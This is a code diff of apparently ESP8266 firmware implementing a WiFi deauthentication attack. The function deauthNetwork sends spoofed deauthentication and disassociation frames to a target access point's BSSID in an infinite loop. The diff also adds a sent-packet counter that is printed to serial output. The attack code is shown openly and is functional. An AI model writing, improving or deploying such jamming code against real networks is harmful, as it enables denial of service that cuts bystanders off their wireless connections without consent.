@@ -22,12 +22,6 @@ bool deauthSetup(){
 // generic function to handle packet sending
 bool sendPacket(uint8_t* packet, uint8_t pktSize, char* pktType){
   int result = wifi_send_pkt_freedom(packet, pktSize, 0);
-
-  if(result != 0){
-    // Serial.printf("%s PACKET FAILED: %d\n", pktType, result);
-  }else{
-    // Serial.printf("%s PACKET SENT: %d\n", pktType, result);
-  }
   return result == 0;
 }
 
@@ -48,11 +42,22 @@ void deauthNetwork(uint8_t targetChannel, uint8_t* targetBSSID){
   memcpy(disassociatePkt, deauthPkt, PACKET_SIZE);
   disassociatePkt[0] = 0xa0; // change packet type to Disassociate
 
+  uint32_t packetCount = 0;
+  uint32_t time = millis();
+  uint32_t lastTime = time;
+
   //send both packets
   while (true){
-    sendPacket(deauthPkt, PACKET_SIZE, "Deauth\0");
+    packetCount += sendPacket(deauthPkt, PACKET_SIZE, "Deauth\0");
     delay(5);
-    sendPacket(disassociatePkt, PACKET_SIZE, "Disassociate\0");
+
+    packetCount += sendPacket(disassociatePkt, PACKET_SIZE, "Disassociate\0");
     delay(5);
+
+    time = millis();
+    if(time - lastTime > 50000){
+      Serial.printf("Sent %d packets\n", packetCount);
+      lastTime = time;
+    }
   }
 }
